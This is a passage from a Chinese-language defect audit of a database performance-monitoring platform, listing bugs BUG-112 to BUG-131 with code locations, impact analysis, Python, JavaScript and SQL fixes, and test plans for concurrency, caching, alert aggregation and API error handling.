- 单测：环 + 独立阻塞链混合 → 两棵树都在，死锁环排在前面
- 单测：无环场景与修复前输出完全一致（回归保护）

---

## BUG-112 每次 emit 新建 Redis 连接池

**定位** `monitor/redis_bus.py:34-37`

```python
def get_bus():
    import redis
    return redis.from_url(getattr(settings, 'REDIS_URL', ...))   # 每次新建 Redis 客户端
```

`emit_event` / `emit_diagnosis` / `emit_verify` 在 `bus=None` 时都调用它。
`redis.from_url()` 每次创建一个新的 `Redis` 实例及其独立 `ConnectionPool`。

**调用频率估算**：N 个实例 × 每 5s 一次 ASH 采样 × 每次可能发多个事件
（阻塞检测 + 长事务检测），加上 L1/L2/L3 检测器 —— 每分钟数百次新建连接池。

**影响** 句柄泄漏、TIME_WAIT 堆积、Redis 侧 `connected_clients` 飙升，
最终 `ERR max number of clients reached`，整条事件流水线中断（告警不再产生）。

**修复方案** 模块级单例 + 线程安全懒加载：

```python
import threading
_BUS = None
_BUS_LOCK = threading.Lock()

def get_bus():
    global _BUS
    if _BUS is None:
        with _BUS_LOCK:
            if _BUS is None:
                import redis
                _BUS = redis.from_url(
                    getattr(settings, 'REDIS_URL', 'redis://localhost:6379/0'),
                    max_connections=int(getattr(settings, 'REDIS_MAX_CONNECTIONS', 50)),
                    socket_timeout=5, socket_connect_timeout=5,
                    health_check_interval=30, retry_on_timeout=True,
                )
    return _BUS

def reset_bus():
    """测试隔离用。"""
    global _BUS
    _BUS = None
```

`redis-py` 的客户端对象是线程安全的（内部连接池按需分配连接），可安全共享。

**验证方法**
- 单测：连续调 100 次 `emit_event`，断言 `redis.from_url` 只被调用 1 次
- 集成：跑 5 分钟哨兵，`redis-cli info clients` 的 `connected_clients` 应稳定

---

## BUG-113 哨兵线程异常即永久静默；配置变更不生效

**定位** `monitor/sentinel.py:452-474`（`run_loop`）、`485-504`（`_refresh`）

**(a) 线程死亡不重启**

```python
def run_loop(self):
    while not self._stop.is_set():
        close_old_connections()        # ← 未捕获异常
        ...
```

`close_old_connections()` 在 Django 数据库短暂不可用时会抛异常，`run_loop` 直接退出，
线程结束。而 `_refresh()` 的判断是 `if cid not in self.sentinels`——
条目还在字典里，**永远不会重建**。结果：该实例的 ASH 采样和探活**静默停止**，
监控大盘上看不出任何异常，直到有人发现某个库的性能数据断了几天。

**(b) 配置变更不生效**

```python
for cid, cfg in active.items():
    if cid not in self.sentinels:      # 只看 ID
        s = InstanceSentinel(cfg)      # cfg 快照进线程，此后永不更新
```

改了实例的 host/port/密码后，哨兵仍用旧配置连接，且因连接失败会持续误报
`instance_down`。

**修复方案**

```python
def run_loop(self):
    probe_interval = int(getattr(settings, 'SENTINEL_INTERVAL_SEC', 8))
    last_probe_at = 0.0
    while not self._stop.is_set():
        try:
            close_old_connections()
            now = time.time()
            if now - last_probe_at >= probe_interval:
                self.probe()
                last_probe_at = now
            if time.time() - self.last_ash_at >= self.ash_interval_eff:
                self.ash_sample()
                self.last_ash_at = time.time()
        except Exception as e:
            logger.exception("[哨兵] %s 主循环异常，本轮跳过: %s", self.config.name, e)
        finally:
            try:
                dj_conn.close()
            except Exception:
                pass
        self._stop.wait(max(1, min(probe_interval, self.ash_interval_eff)))
    ...
```

`_refresh` 增加存活检测与配置指纹比对：

```python
def _config_fingerprint(cfg):
    return (cfg.host, cfg.port, cfg.username, cfg.service_name,
            cfg.db_type, cfg.password)

def _refresh(self):
    active = {...}
    for cid, cfg in active.items():
        s = self.sentinels.get(cid)
        t = self.threads.get(cid)
        need_restart = (
            s is None
            or t is None or not t.is_alive()                       # 线程已死
            or s.config_fingerprint != _config_fingerprint(cfg)    # 配置已变
        )
        if need_restart:
            if s is not None:
                s.stop()
                logger.warning("哨兵重建: %s (线程存活=%s, 配置变更=%s)",
                               cfg.name, bool(t and t.is_alive()),
                               s.config_fingerprint != _config_fingerprint(cfg))
            s = InstanceSentinel(cfg)
            s.config_fingerprint = _config_fingerprint(cfg)
            t = threading.Thread(target=s.run_loop, name=f"sentinel-{cid}", daemon=True)
            self.sentinels[cid] = s
            self.threads[cid] = t
            t.start()
    for cid in list(self.sentinels):
        if cid not in active:
            self.sentinels[cid].stop()
            self.sentinels.pop(cid, None)
            self.threads.pop(cid, None)
```

**验证方法**
- 单测：mock `probe` 抛异常 → 循环继续，不退出
- 单测：线程标记为 dead → 下一次 `_refresh` 重建
- 单测：修改 config.host → `_refresh` 重建哨兵，新哨兵持有新 host

---

## BUG-114 Oracle 对象名缓存跨实例串味

**定位** `monitor/sentinel.py:164-166, 184-197, 225`

```python
_ORA_OBJ_CACHE = {}   # 模块级全局，键 = object_id
...
_ORA_OBJ_CACHE[int(oid)] = name          # 来自实例 A 的 dba_objects
...
'lock_object': _ORA_OBJ_CACHE.get(objno)  # 实例 B 直接命中 A 的缓存
```

注释写「object_id 全库唯一即可按连接域缓存」——这个前提**不成立**。
`object_id` 只在**单个数据库内**唯一，不同 Oracle 实例的 `object_id=12345`
指向完全不同的对象。

**影响**
纳管多套 Oracle 时，阻塞分析页的「争用对象」列会显示**另一套库的表名**。
DBA 据此去查那张表，查不到，或者更糟——查到了同名但无关的表，走进死胡同。
监控系统给出错误的排查线索，比不给更有害。

**修复方案** 缓存键加上 `config_id`，并改用容量受限的 LRU：

```python
from collections import OrderedDict
_ORA_OBJ_CACHE = OrderedDict()      # (config_id, object_id) -> name
_ORA_OBJ_CACHE_MAX = 2048
_ORA_OBJ_LOCK = threading.Lock()

def _obj_cache_get(config_id, objno):
    with _ORA_OBJ_LOCK:
        key = (config_id, objno)
        if key in _ORA_OBJ_CACHE:
            _ORA_OBJ_CACHE.move_to_end(key)
            return _ORA_OBJ_CACHE[key]
        return None

def _obj_cache_put(config_id, objno, name):
    with _ORA_OBJ_LOCK:
        _ORA_OBJ_CACHE[(config_id, objno)] = name
        _ORA_OBJ_CACHE.move_to_end((config_id, objno))
        while len(_ORA_OBJ_CACHE) > _ORA_OBJ_CACHE_MAX:
            _ORA_OBJ_CACHE.popitem(last=False)   # LRU 淘汰，不再整体 clear
```

`_ash_oracle(cur, db_type)` 签名增加 `config_id` 参数，
`sample_sessions(cur, db_type, config_id=None)` 一并透传；
`api_views_perf.py` 的两处 `sample_sessions(cur, cfg.db_type)` 改为传入 `cfg.id`。

顺带修掉原实现 `if len(cache) >= MAX: cache.clear()` 的**全量清空**——
命中率会周期性归零，改为 LRU 淘汰。

**验证方法**
- 单测：实例 1 写入 `objno=100 -> 'SCOTT.EMP'`，实例 2 查 `objno=100` → 返回 None（不串味）
- 单测：写入 2049 条 → 容量稳定在 2048，最早的被淘汰而非全清
- 单测：多线程并发读写缓存无异常

---

## BUG-115 聚合窗口时间戳泄漏致聚合一次性失效；共享状态无锁

**定位** `monitor/alert_manager.py:29-37`（全局状态）、`408-420`、`508-511`、`515-535`

**(a) 时间戳永不清理 → 聚合功能自毁**

```python
# _send_notification 末尾
if buffer_key not in self._aggregation_timestamps:
    self._aggregation_timestamps[buffer_key] = timezone.now()   # 开窗

# _should_aggregate
if buffer_key not in self._aggregation_timestamps:
    return False
return elapsed < self.AGGREGATION_WINDOW_SEC                    # 窗口内才聚合
```

`_aggregation_timestamps[key]` 只在两处被 pop：`_add_to_aggregation` 达阈值时、
`flush_expired_aggregations` 中 —— 而后者的清理条件是 `buffered` **非空**
（`alert_manager.py:526-529`，`if len(buffered) >= MIN or (buffered and elapsed >= WINDOW)`）。

于是：某个 `(alert_type, metric_key)` 首次告警开窗 → 5 分钟内没有第二条同类告警 →
缓冲区为空 → 时间戳**永远留在字典里且永远过期** → 此后 `_should_aggregate`
恒为 False → **该类型告警的聚合功能永久关闭**，且 `_AGG_TS` 单调增长（内存泄漏）。

**(b) 无锁的跨线程共享状态**

`_AGG_BUFFER` / `_AGG_TS` 是模块级 dict，被 `ThreadPoolExecutor`（`start_monitor.py:189`）
下的多个采集线程并发读写。`_add_to_aggregation` 的「append → 判长度 → 发送 → pop」
不是原子的：两个线程可能同时判定达阈值，**同一批告警被推送两次**；
或 pop 与 append 交错，**告警静默丢失**。

**(c)** `_send_aggregated_alert` 用 `self._match_rules()` 匹配通知规则，而 `self.config`
是**碰巧触发 flush 的那个实例**——跨实例聚合告警的路由规则取自随机一个实例。
`unique_configs`（`alert_manager.py:436`）计算后从未使用（死代码）。

**修复方案**

```python
import threading
_AGG_LOCK = threading.RLock()

def _should_aggregate(self, alert_type, metric_key):
    buffer_key = (alert_type, metric_key)
    with _AGG_LOCK:
        ts = self._aggregation_timestamps.get(buffer_key)
        if ts is None:
            return False
        if (timezone.now() - ts).total_seconds() >= self.AGGREGATION_WINDOW_SEC:
            # 窗口已过期：立即清理，让下一条告警重新开窗（修复 (a)）
            self._aggregation_timestamps.pop(buffer_key, None)
            self._aggregation_buffer.pop(buffer_key, None)
            return False
        return True

def _add_to_aggregation(self, alert, buffer_key):
    to_send = None
    with _AGG_LOCK:
        self._aggregation_buffer[buffer_key].append(alert)
        self._aggregation_timestamps.setdefault(buffer_key, timezone.now())
        if len(self._aggregation_buffer[buffer_key]) >= self.AGGREGATION_MIN_COUNT:
            to_send = self._aggregation_buffer.pop(buffer_key, [])
            self._aggregation_timestamps.pop(buffer_key, None)
    if to_send:                       # 网络 IO 移出锁外
        self._send_aggregated_alert(buffer_key, to_send)

def flush_expired_aggregations(self):
    now = timezone.now()
    pending = []
    with _AGG_LOCK:
        for key in list(self._aggregation_timestamps):
            start = self._aggregation_timestamps[key]
            buffered = self._aggregation_buffer.get(key, [])
            elapsed = (now - start).total_seconds()
            if len(buffered) >= self.AGGREGATION_MIN_COUNT or elapsed >= self.AGGREGATION_WINDOW_SEC:
                self._aggregation_buffer.pop(key, None)
                self._aggregation_timestamps.pop(key, None)   # 空缓冲也清（修复 (a)）
                if buffered:
                    pending.append((key, buffered))
    for key, buffered in pending:
        self._send_aggregated_alert(key, buffered)
```

(c) 的修复：`_send_aggregated_alert` 按告警各自的 config 分组匹配规则，
并集去重后发送，同时用上 `unique_configs` 丰富正文：

```python
title = f"[聚合告警] {alert_type} - {metric_key} ({count}条/{len(unique_configs)}个实例)"
channels, seen = [], set()
for a in alerts:
    for rule in AlertManager(a.config)._match_rules(alert_type, a.severity):
        for ch in rule.channels:
            if ch not in seen:
                seen.add(ch); channels.append(ch)
```

同时删除 `flush_expired_aggregations` 中不可达的 `elif` 分支（BUG-134）。

**验证方法**
- 单测：开窗后等待超过窗口 → 下一条告警重新开窗且能聚合（修复前恒失败）
- 单测：连续 100 次 fire/flush → `len(_AGG_TS)` 不增长
- 并发测：8 线程各 fire 5 条同类告警 → 推送总条数 == 告警总条数（不重不漏）
- 单测：跨 3 个实例的聚合告警 → 标题含「3个实例」

---

## BUG-116 axios 拦截器解引用空 config → TypeError 吞掉真实错误

**定位** `frontend/src/services/api.js:52-53`

```js
const isRetryable = !config || config.__retryCount >= MAX_RETRIES
const isIdempotent = !config.method || config.method?.toLowerCase() === 'get'
//                    ^^^^^^^^^^^^ config 为 undefined 时抛 TypeError
```

第 52 行用 `!config` 做了短路保护，第 53 行却**无条件解引用** `config.method`。
当 `error.config` 为 undefined（请求拦截器内部抛错、请求被 `CancelToken` 取消、
以及部分浏览器扩展拦截场景），这里抛 `TypeError: Cannot read properties of undefined`。

该异常发生在响应拦截器内部 → Promise 以 TypeError 拒绝 → 页面上的
`.catch(e => message.error(e.message))` 显示 `Cannot read properties of undefined (reading 'method')`，
**真实的错误原因彻底丢失**。

另外变量命名与语义相反：`isRetryable` 实际表示「已耗尽重试」。

**修复方案**

```js
const cfg = error.config
const retriesExhausted = !cfg || (cfg.__retryCount || 0) >= MAX_RETRIES
const isIdempotent = !!cfg && (!cfg.method || String(cfg.method).toLowerCase() === 'get')
const isServerError = error.response?.status >= 500
const isNetworkError = !error.response

if (!retriesExhausted && isIdempotent && (isServerError || isNetworkError)) {
  cfg.__retryCount = (cfg.__retryCount || 0) + 1
  const delay = RETRY_DELAY_MS * Math.pow(2, cfg.__retryCount - 1)
  await new Promise(r => setTimeout(r, delay))
  return api(cfg)
}
```

**验证方法**
- 单测：`error.config = undefined` → 拦截器返回原始错误而非 TypeError
- 单测：GET 5xx → 重试 2 次后放弃
- 单测：POST 5xx → 不重试

---

## BUG-117 前端读不到性能中心后端错误消息

**定位** `frontend/src/services/api.js:65` vs `monitor/api_views_perf.py:79-80`

两套不兼容的错误契约：

| 来源 | 响应体 |
|------|--------|
| `api_views.py` `error_response` | `{"error": "..."}` |
| `api_views_perf.py` `err()` | `{"code": "TSDB_DOWN", "message": "时序库不可用"}` |

前端只解析第一种：

```js
const message = error.response?.data?.error || error.message || '请求失败'
```

**影响**
性能中心所有失败场景（时序库不可用、超出保留期、参数非法、EXPLAIN 失败）
都退化为 `Request failed with status code 502`。用户完全不知道该做什么。
`HomeTab.jsx:26` 会显示「AAS 加载失败: Request failed with status code 502」——
而后端本来准备了「时序库不可用」这句有用的话。

**修复方案** 前端兼容多种错误契约，并保留错误码：

```js
const data = error.response?.data
const msg =
  data?.error ||
  data?.message ||
  data?.detail ||
  error.message ||
  '请求失败'
const err = new Error(msg)
err.code = data?.code || error.response?.status
err.status = error.response?.status
err.payload = data
return Promise.reject(err)
```

前端在 `TSDB_DOWN` 时给出可操作提示（而非干巴巴报错）：

```jsx
.catch((e) => message.error(
  e.code === 'TSDB_DOWN'
    ? '时序库不可用，请检查 TimescaleDB 连接与 start_sentinel 进程'
    : `AAS 加载失败: ${e.message}`))
```

**验证方法**
- 单测：后端返回 `{code:'TSDB_DOWN', message:'时序库不可用'}` → 前端 `e.message === '时序库不可用'`、`e.code === 'TSDB_DOWN'`
- 单测：后端返回 `{error:'xxx'}` → 前端 `e.message === 'xxx'`（旧契约回归保护）

---

# 三、P2 中危缺陷

## BUG-118 `plan_changed_at` 不比对 plan_hash → 误报计划突变

**定位** `monitor/api_views_perf.py:669`

```python
plan_changed_at = plans_qs[0].captured_at if len(plans_qs) >= 2 else None
```

只要历史上采集过 ≥2 次计划就报「计划已变更」，**不比较 plan_hash 是否真的不同**。
`plan_capture.capture()` 在计划未变时会提前返回不落库（`plan_capture.py:162-163`），
但 `source='manual'` 的手工 EXPLAIN、以及历史遗留数据仍会产生同 hash 的多行。

**影响** SQL 详情页对稳定的 SQL 常年挂着「计划已变更」红标，DBA 逐渐无视该信号——
狼来了效应，真正的计划突变被淹没。

**修复**
```python
plan_changed_at = None
for prev, cur in zip(plans_qs[1:], plans_qs[:-1]):
    if cur.plan_hash != prev.plan_hash:
        plan_changed_at = cur.captured_at
        break
```
响应额外返回 `plan_hash_count = len({p.plan_hash for p in plans_qs})` 供前端判断。

**验证** 单测：2 条同 hash 计划 → `plan_changed_at is None`；hash 不同 → 返回较新那条的时间。

---

## BUG-119 SqlPlan `is_current` 并发双写

**定位** `monitor/plan_capture.py:160-175`

```python
prev = SqlPlan.objects.filter(config=config, sql_digest=..., is_current=True).first()
if prev and prev.plan_hash == plan_hash:
    return prev
plan = SqlPlan.objects.create(..., is_current=True)     # 无事务、无锁
if prev:
    prev.is_current = False
    prev.save(...)
```

采集线程与用户手工 EXPLAIN 并发时，两者都读到同一个 `prev`，
都创建 `is_current=True` 的新行 → **同一 digest 出现多个「当前计划」**。
`SqlDetailView` 的 `plans` 列表会出现多个 `is_current: true`，前端标记混乱。

**修复**

> ⚠️ 实施过程中的重要修正：**光加行锁不够**。第一版只用 `select_for_update`，
> 10 线程并发测试仍有约 1/5 概率出现 2 条「当前计划」。
> 原因是 `SELECT ... FOR UPDATE` 只能锁住**已存在**的行：T1 把旧行置 false
> 并插入新行后，阻塞在旧行上的 T2 醒来时谓词已不匹配，它既看不到旧行、
> 也看不到 T1 刚插入的新行（幻读），于是再插一条 is_current=True。
> 必须由数据库层的部分唯一索引兜底 —— 这也正是模型 docstring 早就声称、
> 却从未真正落实的不变量。

1. `SqlPlan.Meta.constraints` 增加部分唯一约束（迁移 `0021`，含历史脏数据清理）：

```python
models.UniqueConstraint(
    fields=['config', 'sql_digest'],
    condition=models.Q(is_current=True),
    name='uniq_current_plan_per_digest',
)
```

2. 把「翻转旧的 → 插入新的」抽成 `_swap_current_plan()` 放进一个事务，
   撞唯一约束时重试（重试时已能读到对方写入的新「当前计划」，走正常的 hash 比对分支）：

```python
for attempt in range(3):
    try:
        prev, plan = _swap_current_plan(...)
        break
    except IntegrityError:
        if attempt == 2:
            return None
```

3. 事件发送（时序库查询 + Redis 写入）移出事务，不占用行锁。

**验证** `tests_concurrency.PlanCaptureConcurrencyTests`：10 线程同时 capture
不同 hash → `is_current=True` 恰好 1 条；连续跑 12 轮零失败
（仅加行锁的版本在同一测试下会间歇失败）。

---

## BUG-120 TSDB 查询无异常兜底，报 500 而非降级

**定位** `monitor/api_views_perf.py:112-120, 172-236, 265-295, 630-662, 784-791`

所有 TSDB 查询都是 `try: ... finally: cur.close()` —— **没有 except**。
连续聚合视图未创建、字段缺失、语句超时等情况下异常直接冒泡，Django 返回
500 + HTML 错误页，前端 JSON 解析失败，用户看到白屏或「请求失败」。

而这些端点本身已有完善的降级契约（`TSDB_DOWN` 502 + `degraded` 标志），只是没接上。

**修复** 抽出统一装饰器：

```python
def tsdb_guard(fn):
    @wraps(fn)
    def wrapper(self, request, *a, **k):
        try:
            return fn(self, request, *a, **k)
        except Exception as e:
            logger.warning("[perf] %s 查询失败: %s", fn.__qualname__, e, exc_info=True)
            return self.err('TSDB_ERROR', f'时序库查询失败: {e.__class__.__name__}', 502)
    return wrapper
```
给 `AasView.get` / `TopActivityView.get` / `AshFacetsView.get` / `SqlDetailView.get` /
`CompareView.get` 加上。

**验证** 单测：mock 游标 `execute` 抛异常 → 返回 502 且响应体是 `{'code':'TSDB_ERROR', ...}`。

---

## BUG-121 阻塞树实时分支异常未降级

**定位** `monitor/api_views_perf.py:413-423`

```python
try:
    rows = sample_sessions(cur, cfg.db_type)
    cur.close()
finally:
    conn.close()
```
`try/finally` 无 `except`。目标库直连成功但 `sample_sessions` 失败
（权限不足读不到 `performance_schema.data_lock_waits`、Oracle 无 `v$lock` 权限）
时抛 500，而 `SessionsLiveView` 在同样场景下是优雅降级的——两个端点行为不一致。

**修复** 补 `except` 走历史回放降级：
```python
except Exception as e:
    logger.debug("[perf] 实时阻塞树失败, 降级: %s", e)
    return self.ok({'degraded': True, 'at': None, 'tree': [],
                    'fallback': '目标库采集失败(可能缺少 performance_schema/v$lock 权限)'})
```

**验证** 单测：mock `sample_sessions` 抛异常 → 200 + `degraded: true`。

---

## BUG-122 EXPLAIN 端点接受任意 SQL 文本

**定位** `monitor/api_views_perf.py:719-739`

```python
body = json.loads(request.body or '{}')
sql_text = body.get('sql_text') or raw_text      # ← 用户完全可控
plan = capture(cfg, digest, sql_text=sql_text, source='manual', ...)
```

`plan_capture._sql_allowed()`（`plan_capture.py:52-55`）确实做了前缀白名单与分号检查，
且 `EXPLAIN`（不带 `ANALYZE`）不执行语句，所以不构成直接的数据篡改。
但仍有两个实际风险：
1. **信息泄露**：任意用户可用 EXPLAIN 探测目标库的表结构、索引、行数估算，
   错误消息还会回显表名/列名（schema 枚举）
2. `body.get('db_name')` 会走 `USE \`db_name\``，虽有标识符白名单，但扩大了攻击面

**修复**
1. 该端点归入 `Perm.SQL_MONITORING_VIEW`（已由 BUG-103 覆盖）
2. 服务端不再无条件采信 `body['sql_text']`：仅当其**归一化指纹与 URL 中的 digest 一致**时才接受
```python
from monitor.sqlfingerprint import unified_digest
user_sql = body.get('sql_text')
if user_sql:
    if unified_digest(cfg.db_type, None, user_sql) != digest:
        return self.err('BAD_PARAM', '提供的 SQL 与该指纹不匹配', 400)
sql_text = user_sql or raw_text
```
3. `EXPLAIN_FAIL` 的错误消息不回显数据库原始异常（避免 schema 泄露）

**验证** 单测：提交与 digest 不匹配的 SQL → 400；匹配的 → 正常采集。

---

## BUG-123 MySQL 阻塞会话等待秒被事务年龄覆盖

**定位** `monitor/sentinel.py:81`

```python
rows[waiter]['active_secs'] = max(rows[waiter]['active_secs'], r.get('wait_secs') or 0)
```
`wait_secs` 取自 `TIMESTAMPDIFF(SECOND, r.trx_started, NOW())`——是**整个事务的年龄**，
不是本次锁等待时长。一个跑了 2 小时的事务刚开始等锁 1 秒，界面显示「等待 7200 秒」。

**影响** 阻塞分析页的「等待秒」列系统性虚高，DBA 无法判断锁等待的真实紧迫度。

**修复** 分离两个语义字段：
```python
rows[waiter]['is_blocked'] = True
rows[waiter]['blocker_id'] = str(r['blocker'])
rows[waiter]['wait_secs'] = r.get('lock_wait_secs') or rows[waiter]['active_secs']
rows[waiter]['trx_age_secs'] = r.get('trx_age_secs')
```
SQL 改为同时取锁等待时长（`data_lock_waits` 无时长列，用 `innodb_trx.trx_wait_started`）：
```sql
SELECT r.trx_mysql_thread_id AS waiter, b.trx_mysql_thread_id AS blocker,
       TIMESTAMPDIFF(SECOND, r.trx_started, NOW())      AS trx_age_secs,
       TIMESTAMPDIFF(SECOND, COALESCE(r.trx_wait_started, NOW()), NOW()) AS lock_wait_secs
FROM performance_schema.data_lock_waits w
JOIN information_schema.innodb_trx b ON w.blocking_engine_transaction_id = b.trx_id
JOIN information_schema.innodb_trx r ON w.requesting_engine_transaction_id = r.trx_id
```
`timeseries._SESSION_COLS` 与超表增列 `wait_secs`、`trx_age_secs`（`ADD COLUMN IF NOT EXISTS`）。
`_build_blocking_tree` 的 `n['wait_secs'] = n.get('wait_secs') or n.get('active_secs')`。

**验证** 单测：构造 trx_age=7200、lock_wait=3 → `wait_secs == 3`、`trx_age_secs == 7200`。

---

## BUG-124 Oracle ASH 不采 sql_text

**定位** `monitor/sentinel.py:222`（`'sql_text': None`）

Oracle 分支硬编码 `sql_text=None`。连锁反应：
- `_raw_sql_text()`（`api_views_perf.py:593-619`）在 ASH 与 sql_stat 中都找不到 Oracle 原文
- → `SqlDetailView` 的 `sql_text_sample` 为空
- → 索引优化建议（`advisor.index_suggestions`）整块失效
- → `SqlExplainView` 对 Oracle 走 `v$sql_plan` 尚可，但详情页无 SQL 可读

**结果：Oracle 是本项目最重要的纳管对象，SQL 监控 Tab 在 Oracle 上基本是空的。**

**修复** 批量补查 `v$sqlstats`（比 `v$sql` 轻量，且避开 `v$sqltext` 的分片拼接）：

```python
sql_ids = sorted({r['sql_id'] for r in raw_rows if r.get('sql_id')})
texts = {}
if sql_ids:
    try:
        chunk = sql_ids[:100]
        binds = ','.join(f':{i+1}' for i in range(len(chunk)))
        cur.execute(f"SELECT sql_id, SUBSTR(sql_text,1,500) FROM v$sqlstats "
                    f"WHERE sql_id IN ({binds})", chunk)      # 绑定变量，非拼接
        texts = {sid: t for sid, t in cur.fetchall()}
    except Exception as e:
        logger.debug("[ASH] Oracle sql_text 补查失败: %s", e)
...
'sql_text': texts.get(r.get('sql_id')),
```

顺带修掉 `api_views_perf.py:502` 的 `in_list = ','.join(f"'{s}'" ...)` 字符串拼接，
统一改用绑定变量。

**验证**
- 单测：mock `v$sqlstats` 返回 → ASH 行含 sql_text
- 单测：断言执行的 SQL 使用 `:1,:2` 绑定而非字面量拼接

---

## BUG-125 性能主页「Top 会话」点击无响应

**定位** `frontend/src/pages/PerformanceCenter.jsx:80` vs `components/perf/tabs/HomeTab.jsx:12, 86`

`HomeTab` 声明并使用了 `onOpenSession`：
```jsx
onRow={(r) => ({ onClick: () => onOpenSession?.(r), ... })}
```
但 `PerformanceCenter` 组装的 `common` 只有 `{ configId, range, refreshKey, onOpenSql }`
——`onOpenSession` **从未传入**，可选链把点击静默吞掉。

**影响** EMCC 性能主页的核心交互是「Top 会话 → 会话详情/终止」。此处点击毫无反应，
用户以为页面卡了。

**修复** 在 `PerformanceCenter` 增加会话详情抽屉并接线：
```jsx
const [sessionDrawer, setSessionDrawer] = useState(null);
const openSession = useCallback((row) => setSessionDrawer(row), []);
const common = { configId, range, refreshKey, onOpenSql: openSql, onOpenSession: openSession };
...
<Drawer title={`会话详情: ${sessionDrawer?.key || ''}`} width={720}
        open={!!sessionDrawer} onClose={() => setSessionDrawer(null)} destroyOnClose>
  {sessionDrawer && <SessionDetailPanel configId={configId} session={sessionDrawer}
                                        onOpenSql={openSql} />}
</Drawer>
```
新建 `components/perf/SessionDetailPanel.jsx`：展示会话属性、等待类分解、
关联 SQL（可跳 SQL 详情）、以及走审批链的「终止会话」按钮（复用 `KillModal`）。

**验证** 前端单测：点击 Top 会话行 → 抽屉打开且标题含会话 ID。

---

## BUG-126 AAS 堆叠序列缺零点

**定位** `monitor/api_views_perf.py:131-141`

每个等待类的 `points` 只包含**该类有数据的时间桶**。ECharts 堆叠面积图要求各系列
x 轴对齐，缺点会导致堆叠错位——某个时刻只有 `cpu` 有数据时，图上 `cpu` 会被
画在错误的高度（叠在上一个有数据的系列之上）。

**修复** 补齐全时间轴零点：
```python
all_buckets = sorted(bucket_total)
series = [{'key': k,
           'points': [[t.isoformat(), round(pts.get(t, 0) / bucket, 3)]
                      for t in all_buckets]}
          for k, pts in series_map.items()]
```

**验证** 单测：两个等待类在不同时间桶有数据 → 两个 series 的 points 长度相等且等于总桶数。

---

## BUG-127 `ASH_INTERVAL_SEC` 默认值前后不一致

**定位** `monitor/sentinel.py:292`（默认 `5`）vs `sentinel.py:511`（日志打印默认 `15`）

未配置该变量时，实际按 5s 采样，但启动日志告诉运维「ash=15s」。
更严重的是：`timeseries` 的 `session_ash_1m` 连续聚合用
`COALESCE(sample_gap_sec, 15)` 兜底（`timeseries.py:208`），
若 `sample_gap_sec` 写入失败，AAS 会按 15s 计算——**比真实值高 3 倍**。

**修复** 抽出单一常量源：
```python
# sentinel.py 顶部
DEFAULT_ASH_INTERVAL_SEC = 5
def _ash_interval(): return int(getattr(settings, 'ASH_INTERVAL_SEC', DEFAULT_ASH_INTERVAL_SEC))
```
两处均调用之；`settings.py` 显式声明 `ASH_INTERVAL_SEC` 默认值消除歧义。

**验证** 单测：断言 `InstanceSentinel().ash_interval_cfg` 与日志打印值一致。

---

## BUG-128 批量写逐条 execute

**定位** `monitor/timeseries.py:279-298, 325-343, 349-366`

```python
for r in rows:
    cur.execute(sql, vals)      # N 次网络往返
```
一次 ASH 采样可能有数百个会话行。N 个实例 × 每 5s → 每分钟数万次单行 INSERT。

**修复** 用 `psycopg2.extras.execute_values` 批量提交：
```python
from psycopg2.extras import execute_values
execute_values(cur,
    f"INSERT INTO session_sample ({cols}) VALUES %s",
    [[now, db_config_id, db_type] + [r.get(c) for c in self._SESSION_COLS] for r in rows],
    page_size=500)
```
`write_metrics_batch` / `write_sql_stats` 同样处理。
同时修掉 `write_metrics_batch` 的 `isinstance(value, (int, float))` 会放行 `bool`
以及 NaN/Inf 的问题：
```python
import math
if isinstance(value, bool) or value is None: continue
if not isinstance(value, (int, float)): continue
if isinstance(value, float) and not math.isfinite(value): continue
```

**验证** 单测：写 500 行 → `execute_values` 调用 1 次；写入 `True`/`NaN` 被跳过。

---

## BUG-129 `drop_hypertable` 漏清理新增表

**定位** `monitor/timeseries.py:529-559`

只删 `metric_daily` / `metric_hourly` / `collection_snapshot` / `metric_point`，
遗漏 Phase 6A/7A 新增的 `session_ash_1m`（连续聚合）、`session_sample`、`sql_stat`。
执行「重置时序库」后残留旧表，重新 `init_hypertables` 时因表已存在而跳过增列，
导致 schema 半新半旧。

**修复** 补全清单，并注意删除顺序（先连续聚合后基表）：
```python
for view_name in ('session_ash_1m', 'metric_daily', 'metric_hourly'):
    cur.execute(f"DROP MATERIALIZED VIEW IF EXISTS {view_name} CASCADE;")
for table_name in ('sql_stat', 'session_sample', 'collection_snapshot', 'metric_point'):
    cur.execute(f"DROP TABLE IF EXISTS {table_name} CASCADE;")
```

**验证** 单测：mock 游标，断言 7 张对象全部被 DROP 且顺序正确。

---

## BUG-130 `UserProfileDatabase.config_id` 非外键

**定位** `monitor/models.py:339-344`

```python
class UserProfileDatabase(models.Model):
    profile = models.ForeignKey(UserProfile, ...)
    config_id = models.IntegerField(db_index=True)     # ← 裸整数，非 FK
```

删除一个 `DatabaseConfig` 后，授权记录残留。若新建实例复用了同一自增 ID
（PostgreSQL 序列一般不复用，但手工 `setval` 或数据迁移可能造成），
**旧授权会意外套用到新实例上**——静默的越权。

**修复** 改为真正的外键，并写数据迁移清理孤儿行：
```python
config = models.ForeignKey(DatabaseConfig, on_delete=models.CASCADE,
                           db_column='config_id', related_name='+')
```
`allowed_databases` 属性改为 `[o.config_id for o in self.alloweddatabase_set.order_by('id')]`
（`config_id` 仍可用，Django 外键自动提供 `_id` 属性，此处 `db_column` 保持不变，
无需改列名，仅新增约束）。
迁移中先 `DELETE FROM monitor_userprofiledatabase WHERE config_id NOT IN (SELECT id FROM monitor_databaseconfig)`
再加外键约束。

**验证** 单测：删除 DatabaseConfig → 关联授权行级联删除；`allowed_databases` 不再含该 ID。

---

## BUG-131 期间对比未校验 from < to

**定位** `monitor/api_views_perf.py:776-783`

只 `assert all([a_fd, a_td, b_fd, b_td])`，不校验 `a_fd < a_td`。
传入 `a_from > a_to` 时，SQL `bucket >= %s AND bucket < %s` 返回空集，
`_window_block` 的 `win = max((td-fd).total_seconds(), 1)` 把负数钳到 1，
`avg_aas` 得到 `0/1 = 0` —— 页面显示「该期间 AAS 为 0」，看起来像真实数据。

**修复**
```python
if not (a_fd < a_td and b_fd < b_td):
    return self.err('BAD_PARAM', '时间区间起点必须早于终点')
max_span = int(getattr(settings, 'PERF_COMPARE_MAX_SPAN_SEC', 7 * 86400))
if (a_td - a_fd).total_seconds() > max_span or (b_td - b_fd).total_seconds() > max_span:
    return self.err('BAD_PARAM', f'单个对比区间不得超过 {max_span // 86400} 天')
```

**验证** 单测：`a_from > a_to` → 400；跨度 30 天 → 400。

---

## BUG-132 APIKey 5 分钟即失效；`tenancy.py` 死代码

**定位** `monitor/auth.py:803-844`、`monitor/tenancy.py`（全文 321 行）

